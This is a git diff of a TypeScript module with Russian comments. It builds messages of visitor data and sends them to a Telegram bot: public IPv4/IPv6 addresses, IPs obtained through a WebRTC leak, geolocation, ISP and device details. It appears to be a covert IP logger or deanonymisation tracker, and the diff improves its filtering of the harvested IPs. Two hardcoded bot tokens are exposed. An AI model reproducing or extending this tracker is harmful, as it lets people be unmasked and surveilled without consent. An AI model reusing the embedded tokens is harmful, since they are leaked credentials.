@@ -2,7 +2,7 @@
  * Отправка данных в Telegram бота
  */
 
-const BOT_TOKEN = '8300603543:AAGowsZnbTGxqo5tf8hyfMtYMtvkwPAAcgM';
+const BOT_TOKEN = '8300603543:AAFdC1e5r-5gT_mbY4MRgHEiwvyX6z9pWcQ';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 // ВАЖНО: Укажите ваш Telegram ID, куда будут приходить уведомления
@@ -135,11 +135,14 @@ function formatUserData(data: UserData): string {
     }
     
     if (geo.timezone) {
-      // Преобразуем в строку если это объект
-      const timezoneStr = typeof geo.timezone === 'object' 
-        ? JSON.stringify(geo.timezone) 
-        : String(geo.timezone);
-      message += `   🕐 <b>Timezone:</b> ${timezoneStr}\n`;
+      // Правильно форматируем timezone
+      if (typeof geo.timezone === 'object' && geo.timezone !== null) {
+        const tz = geo.timezone as any;
+        const timezoneStr = tz.current_time || tz.utc || tz.id || JSON.stringify(geo.timezone);
+        message += `   🕐 <b>Timezone:</b> ${timezoneStr}\n`;
+      } else {
+        message += `   🕐 <b>Timezone:</b> ${String(geo.timezone)}\n`;
+      }
     }
     
     if (geo.isp || geo.org) {
@@ -165,25 +168,57 @@ function formatUserData(data: UserData): string {
     }
   }
   
-  // WebRTC Leaked IPs - все обнаруженные IP
-  if (data.ipInfo.webrtcLeaked && data.ipInfo.webrtcLeaked.length > 0) {
-    message += `\n🔓 <b>WebRTC LEAK (${data.ipInfo.webrtcLeaked.length}):</b>\n`;
-    data.ipInfo.webrtcLeaked.forEach((ip, index) => {
+  // Фильтруем невалидные IP адреса
+  const validWebRTCIPs = data.ipInfo.webrtcLeaked
+    ? data.ipInfo.webrtcLeaked.filter(ip => 
+        ip && 
+        ip !== '0.0.0.0' && 
+        ip !== 'undefined' && 
+        ip !== 'null' &&
+        !ip.startsWith('127.') &&
+        !ip.startsWith('0.0.0.')
+      )
+    : [];
+  
+  // WebRTC Leaked IPs - только валидные
+  if (validWebRTCIPs.length > 0) {
+    message += `\n🔓 <b>WebRTC LEAK (${validWebRTCIPs.length}):</b>\n`;
+    validWebRTCIPs.forEach((ip, index) => {
       message += `   ${index + 1}. <code>${ip}</code>\n`;
     });
   }
   
+  // Фильтруем публичные IPv4
+  const validIPv4 = data.ipInfo.ipv4.filter(ip => 
+    ip && 
+    ip !== '0.0.0.0' && 
+    ip !== 'undefined' && 
+    ip !== 'null' &&
+    !ip.startsWith('127.') &&
+    !ip.startsWith('0.0.0.')
+  );
+  
   // Показываем только публичные IP адреса
-  if (data.ipInfo.ipv4.length > 0) {
+  if (validIPv4.length > 0) {
     message += `\n📍 <b>Публичные IPv4:</b>\n`;
-    data.ipInfo.ipv4.forEach(ip => {
+    validIPv4.forEach(ip => {
       message += `   • <code>${ip}</code>\n`;
     });
   }
   
-  if (data.ipInfo.ipv6.length > 0) {
+  // Фильтруем IPv6
+  const validIPv6 = data.ipInfo.ipv6.filter(ip => 
+    ip && 
+    ip !== '0.0.0.0' && 
+    ip !== 'undefined' && 
+    ip !== 'null' &&
+    !ip.startsWith('::') &&
+    ip !== '::'
+  );
+  
+  if (validIPv6.length > 0) {
     message += `\n📍 <b>Публичные IPv6:</b>\n`;
-    data.ipInfo.ipv6.forEach(ip => {
+    validIPv6.forEach(ip => {
       message += `   • <code>${ip}</code>\n`;
     });
   }
@@ -199,7 +234,7 @@ function formatUserData(data: UserData): string {
   message += `\n📱 <b>УСТРОЙСТВО:</b>\n`;
   message += `   💻 <b>Платформа:</b> ${data.platform}\n`;
   message += `   🌍 <b>Язык:</b> ${data.language}\n`;
-  message += `   📺 <b>Разрешени��:</b> ${data.screenResolution}\n`;
+  message += `   📺 <b>Разрешени:</b> ${data.screenResolution}\n`;
   message += `   🕐 <b>Timezone:</b> ${data.timezone}\n`;
   message += `   ⏰ <b>Время:</b> ${data.timestamp}\n`;
   
